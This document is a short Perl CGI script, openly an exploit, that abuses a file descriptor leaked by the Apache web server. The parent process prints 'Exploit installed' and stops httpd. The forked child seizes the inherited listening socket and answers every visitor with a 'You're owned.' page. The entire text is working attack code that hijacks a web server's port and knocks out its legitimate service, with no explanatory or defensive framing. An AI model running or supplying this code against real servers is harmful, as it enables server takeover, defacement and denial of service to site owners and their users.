#!/usr/bin/perl

use POSIX qw(setsid);

if (!defined(my $pid = fork)) {
        print "Content-Type: text/html\n\n";
        print "cannot fork: $!";
        exit 1;
} elsif ($pid) { # This is the parent
        sleep(1);
        print "Content-Type: text/html\n\n";
        print "<html><body>Exploit installed</body></html>";
        system '/usr/sbin/httpd2 -k stop';
        sleep(2);
        exit 0;
}

# This is the Child
setsid;
sleep(2);
my $leak = 4;
open(Server, "+<&$leak");
while (1) {
        my $rin = '';
        vec($rin,fileno(Server),1) = 1;
        $nfound = select($rout = $rin, undef, undef, undef);
        if (accept(Client,Server) ) {
                print Client "HTTP/1.0 200 OK\n";
                print Client "Content-Length: 40\n";
                print Client "Content-Type: text/html\n\n";
                print Client "<html><body>";
                print Client "You're owned.";
                print Client "</body></html>";
                close Client;
        }
}

